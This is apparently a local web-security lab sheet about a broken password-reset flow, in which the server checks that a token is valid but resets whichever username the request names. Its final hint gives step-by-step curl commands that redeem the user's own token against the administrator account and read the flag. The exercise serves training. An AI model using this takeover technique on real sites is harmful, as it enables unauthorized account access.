# Lab 10 — Password reset broken logic

**Difficulty:** ★ Apprentice
**Goal:** log in as `administrator` and read the flag from `/admin`
**You have:** a working account `wiener` / `peter` **and your own mailbox** (`/mail`)

Passwords can be reset by email — and after a reset, the account you just
recovered should be the account the token belongs to. The token here proves
*validity*, not *ownership*.

## Hint ladder

**Hint 1 (stuck):** Go through the flow for your own account: request a
reset for `wiener`, open `/mail`, follow the link, set a new password, log
in. Works, right? Now look at the reset form's fields — what decides WHICH
user's password changes?

**Hint 2 (still stuck):** The reset POST carries `token`, `username`, and
`new-password`. The server checks the token is real… then updates whatever
`username` the request says. Your token is *yours*, but `username` is
whatever you type.

**Hint 3 (last rung — the actual attack):** Request a reset for `wiener`,
grab your token from `/mail`, then redeem it against the administrator:
```bash
curl -s -b jar -d 'username=wiener' http://127.0.0.1:8110/forgot-password
# ... open /mail, copy ?token=...
curl -s -b jar -d "token=<your token>&username=administrator&new-password=Pwn3d!" http://127.0.0.1:8110/forgot-password
curl -s -c jar2 -d 'username=administrator&password=Pwn3d!' http://127.0.0.1:8110/login
curl -s -b jar2 http://127.0.0.1:8110/admin
```

## Reset

```bash
docker compose restart lab10-password-reset-broken-logic
```